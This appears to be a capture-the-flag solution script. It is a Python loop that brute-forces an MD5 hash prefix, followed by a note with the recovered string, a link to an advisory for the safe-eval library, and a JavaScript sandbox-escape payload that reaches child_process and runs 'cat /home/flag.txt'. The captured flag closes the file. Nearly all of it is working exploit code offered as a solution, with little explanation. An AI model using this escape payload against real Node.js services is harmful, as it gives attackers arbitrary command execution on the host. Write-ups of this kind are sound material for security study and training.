import hashlib
import itertools
import string

for bf in itertools.product(string.ascii_letters + string.digits, repeat=8):
    password = "".join(bf).encode()
    h = hashlib.md5()
    h.update(password)
    if h.hexdigest().startswith("f07bef"):
        print(password)

"""
aaacJbPL

https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064

import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('cat /home/flag.txt')

PWNME{g0D_jOB!_S4Fe-ev41_w4S_N0t_WeRY_2Af3}
"""
